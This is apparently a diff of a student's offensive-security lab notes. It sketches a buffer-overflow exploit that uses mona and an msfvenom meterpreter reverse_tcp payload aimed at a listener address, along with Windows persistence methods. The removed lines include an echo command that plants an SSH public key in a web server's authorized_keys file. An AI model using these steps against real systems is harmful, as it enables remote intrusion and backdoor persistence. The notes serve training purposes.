@@ -531,8 +531,10 @@ put it in script
 type this !mona jmp -r esp -m "<the dll>" 
 convert address to big endian 
 make payload :  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.41.112 lport=4444 -b "\x00" -f python 
+tunnel to the box connected to the secure server port 
+set the script port to: 127.0.0.1:<the tunnel port>
 msfconsole: use multi/handler set payload to what we used, set lhost to 0.0.0.0 and lport to the one we used, run 
-
+run the script 
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -618,7 +620,10 @@ covering your tracks
 
 
 windows exploits 
------------------------------------\
+-----------------------------------
+
+
+
 pressitance
 ---------------------
 scheduled tasks -> tigger ,services -> startup , registry (boot)-> hklm..\run,runonce
@@ -681,30 +686,5 @@ event viewer use to to look at system logs
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-ports 3333,7418=192.168.28.111
-      9638=10.100.28.40:80
-      9999:10.100.28.55:80
-      3375:192.168.28.100
-
-
-
-comerade
-
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDIxv7ahuM2lTWIsG6zH4+yR6qnxPbeobVlXv1fyz/rS4OiO8E/ntElyhMgQlYG9P/cPJpqJKFfihqtZDciRxBE1XoklbWpuW+CYsk2zOIl1QZL0jHaFGSEfzY7ZUqkKehbwlI0s33rx0JsBvIz1RQTUzImcFpi1IW8V1YmWpR6Sw+e/wSVFr0on4mPRO0TuO/xJ0Ie7RcQt2SFVxkZXpJCrFEg9UikBaWtJEmUyTILyfVsJcMgG21y19GKGUWJu92Qjy29oj39zhaXc1R1aIBIpp1vojEwhqMm4qRc30sQWJz3RIriItmuh8oBV9sglH20ZlTt/s6/PWCw6huErfXW5IeNEyN6znf2a0ZAyEKJtQK6tCcycCQjRHj18iSuCeTVPSvF+ZBBUbI0jV6M5bXYfX71Cp4/Hmdx9wewFPNJR2sQ1PHO98kYfhMIKlRLAnA6DCo3B6ukalGduflag/iiK1ze8Ka5GROxnNpelZGv3a7sf+g52kRCHPTr3HDR2Po3QwKJBb38CBtlQ3XAh6DRuQsVSxBWCuM4xKb60s/RbyVKmx/d+Og303DzTwe+m2BBaXRG3aSPHkWA3RRtnbAxN4lqjBtm7kEoICyww8Dk8zOMydw+Qw4KV7TRT7RO/B0s8ypUCE8FaHdb1RLUInYIk7q/3z8gXBsQGOyR3PLs9Q== student@lin-ops'>> /var/www/.ssh/authorized_keys
 
 
